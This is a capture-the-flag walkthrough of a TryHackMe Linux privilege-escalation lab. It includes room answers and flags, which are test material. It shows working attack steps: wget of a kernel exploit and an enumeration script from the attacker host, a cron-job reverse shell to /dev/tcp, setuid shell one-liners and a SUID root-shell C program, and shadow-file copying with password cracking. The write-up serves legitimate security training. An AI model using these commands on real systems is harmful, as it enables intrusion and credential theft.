---
description: https://tryhackme.com/room/linprivesc
---

# Linux PrivEsc

## Task 3 Enumeration

```bash
ssh karen@10.10.177.194
bash
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 19-41-42.png>)

#### What is the hostname of the target system?

```bash
hostname
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 19-44-57.png>)

{% hint style="success" %}
`wade7363`
{% endhint %}

#### What is the Linux kernel version of the target system?

```bash
uname -a
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 19-45-05.png>)

{% hint style="success" %}
`3.13.0-24-generic`
{% endhint %}

#### What Linux is this?

```bash
cat /etc/issue
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 19-51-18.png>)

{% hint style="success" %}
`Ubuntu 14.04 LTS`
{% endhint %}

#### What version of the Python language is installed on the system?

```bash
python -V
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 20-45-12.png>)

{% hint style="success" %}
`2.7.6`
{% endhint %}

#### What vulnerability seem to affect the kernel of the target system?

```bash
searchsploit -w 3.13.0
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 20-47-40.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-18 20-48-03.png>)

{% hint style="success" %}
`CVE-2015-1328`
{% endhint %}

## Task 5 Privilege Escalation: Kernel Exploits

#### find and use the appropriate kernel exploit to gain root privileges on the target system.

```bash
searchsploit -m 37292
cp 37272.c /var/www/html
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-09-30.png>)

```bash
wget http://10.6.9.176/37292.c -P /tmp
gcc -o /tmp/37292 /tmp/37292.c
/tmp/37292
bash
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-11-34.png>)

```bash
find / -type f -name flag1.txt 2>/dev/null
cat /home/matt/flag1.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-14-31.png>)

## Task 6 Privilege Escalation: Sudo

```bash
ssh karen@10.10.195.163
bash
```

#### How many programs can the user "karen" run on the target system with sudo rights?

```bash
sudo -l
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-27-30.png>)

{% hint style="success" %}
`3`
{% endhint %}

#### What is the content of the flag2.txt file?

```bash
sudo /usr/bin/find / -type f -name flag2.txt -exec cat {} \; 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-28-46.png>)

{% hint style="success" %}
`THM-402028394`
{% endhint %}

#### How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-33-46.png>)

{% hint style="success" %}
`sudo nmap --interactive`
{% endhint %}

#### What is the hash of frank's password?

```bash
sudo /usr/bin/less /etc/shadow
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-31-35.png>)

{% hint style="success" %}
`$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1`
{% endhint %}

## Task 7 Privilege Escalation: SUID

```bash
ssh karen@10.10.12.98
bash
```

#### Which user shares the name of a great comic book writer?

```bash
cat /etc/passwd | grep home
```

{% hint style="success" %}
`gerryconway`
{% endhint %}

#### What is the password of user2?

```bash
wget http://10.6.9.176/suid3num.py -P /tmp
python3 /tmp/suid3num.py
base64 /etc/passwd | base64 -d > /tmp/passwd
base64 /etc/shadow | base64 -d > /tmp/shadow
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-52-45.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-55-38.png>)

```bash
scp karen@10.10.12.98:/tmp/{passwd,shadow} .
unshadow passwd shadow > crackme
john --wordlist=/usr/share/wordlists/rockyou.txt crackme
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-55-28.png>)

{% hint style="success" %}
`Password1`
{% endhint %}

#### What is the content of the flag3.txt file?

```bash
find / -type f -name flag3.txt 2>/dev/null
base64 /home/ubuntu/flag3.txt | base64 -d
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 21-59-46.png>)

{% hint style="success" %}
`THM-3847834`
{% endhint %}

## Task 8 Privilege Escalation: Capabilities

```bash
ssh karen@10.10.241.117
bash
```

#### Complete the task described above on the target system

#### How many binaries have set capabilities?

```bash
getcap -r / 2>/dev/null
```

{% hint style="success" %}
`6`
{% endhint %}

#### What other binary can be used through its capabilities?

{% hint style="success" %}
`view`
{% endhint %}

#### What is the content of the flag4.txt file?

```bash
find / -type -name flag4.txt 2>/dev/null
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
cat /home/ubuntu/flag4.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-18 22-12-11.png>)

{% hint style="success" %}
`THM-9349843`
{% endhint %}

## Task 9 Privilege Escalation: Cron Jobs

```bash
ssh karen@10.10.129.134
bash
```

#### How many user-defined cron jobs can you see on the target system?

```bash
cat /etc/crontab
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 06-52-00.png>)

{% hint style="success" %}
`4`
{% endhint %}

#### What is the content of the flag5.txt file?

```bash
echo '#!/bin/bash' > backup.sh
echo 'sh -i >& /dev/tcp/10.6.9.176/4444 0>&1' >> backup.sh
chmod +x backup.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 06-58-50.png>)

```bash
nc -nvlp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
find / -type f -name flag5.txt -exec cat {} \; 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-02-20.png>)

{% hint style="success" %}
`THM-383000283`
{% endhint %}

#### What is Matt's password?

```bash
cp /etc/{passwd,shadow} /tmp
chmod o+r /tmp/shadow
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-07-30.png>)

```bash
scp karen@10.10.129.234:/tmp/{passwd,shadow} .
unshadow passwd shadow > crackme
john --wordlist=/usr/share/wordlists/rockyou.txt crackme
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-08-15.png>)

{% hint style="success" %}
`123456`
{% endhint %}

## Task 10 Privilege Escalation: PATH

```bash
ssh karen@10.10.240.172
bash
```

#### What is the odd folder you have write access for?

```bash
find / -type d -writable 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-27-02.png>)

{% hint style="success" %}
`/home/murdoch`
{% endhint %}

#### Exploit the $PATH vulnerability to read the content of the flag6.txt file.

```bash
cd /home/murdoch/
ls -l
./test
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-30-11.png>)

#### What is the content of the flag6.txt file?

```bash
cp /bin/bash thm
PATH=/home/murdoch:$PATH ./test
find / -type f -name flag6.txt -exec cat {} \; 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-33-25.png>)

{% hint style="success" %}
`THM-736628929`
{% endhint %}

## Task 11 Privilege Escalation: NFS

```bash
ssh karen@10.10.15.235
bash
```

#### How many mountable shares can you identify on the target system?

```bash
showmount -e 10.10.15.235
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-47-20.png>)

{% hint style="success" %}
`3`
{% endhint %}

#### How many shares have the "no\_root\_squash" option enabled?

```bash
cat /etc/exports
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 07-47-30.png>)

{% hint style="success" %}
`3`
{% endhint %}

#### Gain a root shell on the target system

```bash
mkdir /tmp/share
sudo mount 10.10.15.235:/home/ubuntu/sharedfolder /tmp/share
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-01-23.png>)

```bash
sudo vim /tmp/share/nfs.c
sudo gcc -o /tmp/share/nfs /tmp/share/nfs.c
sudo chmod +s /tmp/share/nfs
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-03-53.png>)

```c
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

#### What is the content of the flag7.txt file?

```bash
ls -l /home/ubuntu/sharedfolder/
/home/ubuntu/sharedfolder/nfs
find / -type f -name flag7.txt -exec cat {} \; 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-03-41.png>)

{% hint style="success" %}
`THM-89384012`
{% endhint %}

## Task 12 Capstone Challenge

```bash
ssh leonard@10.10.85.59
```

#### What is the content of the flag1.txt file?

```bash
wget http://10.6.9.176/suid3num.py
python suid3num.py
base64 /etc/shadow | base64 -d > /tmp/shadow
base64 /etc/passwd | base64 -d > /tmp/passwd
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-19-34.png>)

```bash
scp leonard@10.10.85.59:/tmp/{passwd,shadow} .
unshadow passwd shadow > crackme
john --wordlist=/usr/share/wordlists/rockyou.txt crackme
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-25-06.png>)

```bash
su - missy
find / -type f -name flag1.txt 2>/dev/null
cat /home/missy/Documents/flag1.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-26-13.png>)

{% hint style="success" %}
`THM-42828719920544`
{% endhint %}

#### What is the content of the flag2.txt file?

```bash
sudo -l
sudo /usr/bin/find / -type f -name flag2.txt -exec cat {} \; 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2022-03-19 08-27-36.png>)

{% hint style="success" %}
`THM-168824782390238`
{% endhint %}
